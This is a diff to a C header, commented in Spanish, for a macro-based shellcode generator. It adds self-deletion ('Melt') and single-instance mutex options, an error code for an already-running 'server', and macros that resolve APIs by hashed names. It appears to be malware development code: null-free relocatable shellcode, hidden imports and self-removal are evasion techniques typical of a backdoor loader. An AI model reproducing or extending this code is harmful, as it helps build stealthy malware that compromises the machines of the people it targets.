@@ -10,6 +10,8 @@
 **            +Un shellcode libre de bytes nulos
 **            +Direcciones relativas que permitan la reubicación del código
 **            +Un gestor de errores
+**            +Melt
+**            +Mutex
 *###############################################################################*/
 
 #include "preprocessor/seq/for_each_i.hpp"
@@ -17,6 +19,16 @@
 #include "preprocessor/seq/size.hpp"
 #include "preprocessor/cat.hpp"
 
+/*###############################################################################
+** Mutex:
+**    Si se define la compilación MUTEX el código generado no se ejecutará dos
+**    veces
+**    NOTA:{
+**        Se añade código, como consecuencia aumenta el tamaño
+**    }
+*###############################################################################*/
+#define MUTEX
+#undef MUTEX
 
 /*###############################################################################
 ** Error_Check:
@@ -42,6 +54,7 @@
     #define ERR_HST 0x2     //Ha habido un error al resolver el Hostname. Probablemente debido a un problema de conexión.
     #define ERR_MEM 0x3     //Ha habido un error al reservar memoria.
     #define ERR_SUM 0x4     //Ha habido un error en la suma de comprobación.
+    #define ERR_MTX 0x5     //El server ya está en ejecución.
 #endif
 
 /*###############################################################################
@@ -68,14 +81,13 @@
 **      def hash(s):
 **          r = 0
 **          for x in s:
-**              r>>=1
 **              r^=(ord(x)*ord(x))
 **          return r
 **    Después de generar el hash lo introduce en el binario.
 **    El tamaño del hash es de 16 bits (1 WORD)
 *###############################################################################*/
 #define HASH_AND_EMIT(SEQ) EMIT_WORD(BOOST_PP_SEQ_FOLD_LEFT(CRYPT_BYTE, 0, SEQ))
-#define CRYPT_BYTE(s, st, x) ((((st)>>1)^((x)*(x))))
+#define CRYPT_BYTE(s, st, x) (((st)^((x)*(x))))
 
 /*###############################################################################
 ** EMIT_* :
@@ -92,18 +104,27 @@
     EMIT_WORD(((d) >> 16))
 
 /*###############################################################################
-** CREATE_IDS:
-**    Macro que recibe una lista de aliases.Calcula y almacena su posición en el 
-**    stack de direcciones.
-**    Además genera un ultimo alias llamado STACKSIZE con el tamaño total del 
-**    stack utilizado.
-**    NOTA:{
-**        ¡¡¡LOS HASHES DEBEN DECLARSE EN EL MISMO ORDEN QUE LOS ALIASES!!!
-**    }
+** API_DEFINE:
+**    Macro que genera el offset de la función en el stack de APIs y calcula su
+**    hash.
 *###############################################################################*/
-#define CREATE_IDS(SEQ)\
-    enum IDS{BOOST_PP_SEQ_FOR_EACH_I(ENUM_ITEM, 0, SEQ) STACKSIZE = (BOOST_PP_SEQ_SIZE(SEQ)*4)};
-#define ENUM_ITEM(r, d, i, e) BOOST_PP_CAT(_, e) = (i*4),
+#define API_DEFINE(name, SEQ)\
+    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)};\
+    HASH_AND_EMIT(SEQ)
+/*###############################################################################
+** VAR_DEFINE:
+**    Macro que genera el offset de una variable en el stack de APIs y calcula su
+**    hash.
+*###############################################################################*/
+#define VAR_DEFINE(name)\
+    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)};
+
+/*###############################################################################
+** CALC_STACKSIZE:
+**    Macro que calcula el tamaño del stack de APIs
+*###############################################################################*/
+#define CALC_STACKSIZE()\
+    enum {STACKSIZE = (__COUNTER__*4)};
 
 /*###############################################################################
 ** Macros de shellcode:
